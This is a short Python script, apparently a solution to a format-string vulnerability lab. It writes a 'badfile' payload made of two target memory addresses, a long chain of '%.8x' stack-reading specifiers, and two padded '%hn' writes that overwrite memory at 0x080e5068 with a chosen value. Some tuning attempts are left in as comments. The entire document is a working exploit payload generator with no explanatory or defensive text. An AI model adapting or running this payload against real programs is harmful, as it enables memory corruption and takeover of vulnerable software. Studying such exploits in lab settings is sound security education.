#!/usr/bin/python3
import sys

# Initialize the content array
N = 1500
content = bytearray(0x0 for i in range(N))

# This line shows how to store a 4-byte integer at offset 0
number  = 0x080e5068
content[0:4]  =  (number).to_bytes(4,byteorder='little')

# This line shows how to store a 4-byte string at offset 4
content[4:8]  = ("abcd").encode('latin-1')

number  = 0x080e506A
content[8:12]  =  (number).to_bytes(4,byteorder='little')

target_high = 0xffff
target_low = 0xd210 - 144

#content[0:4]  = ("@@@@").encode('latin-1')
# This line shows how to construct a string s with
#   12 of "%.8x", concatenated with a "%n"
#s = "%.8x "*100 + "%n"
s = ""
#for i in range(200):
#	s += str(i) + ":%.8x "
#s += "%.43104x %hn %.8736x %hn"
for i in range(62):
	s += str(i) + ":%.8x "
s += "%."+str(target_low-0x2eb)+"x %hn %."+str(target_high-target_low-2)+"x %hn"
# The line shows how to store the string s at offset 8
fmt  = (s).encode('latin-1')
content[12:12+len(fmt)] = fmt
#content[4:4+len(fmt)] = fmt
print(len(fmt))
# Write the content to badfile
with open('badfile', 'wb') as f:
  f.write(content)
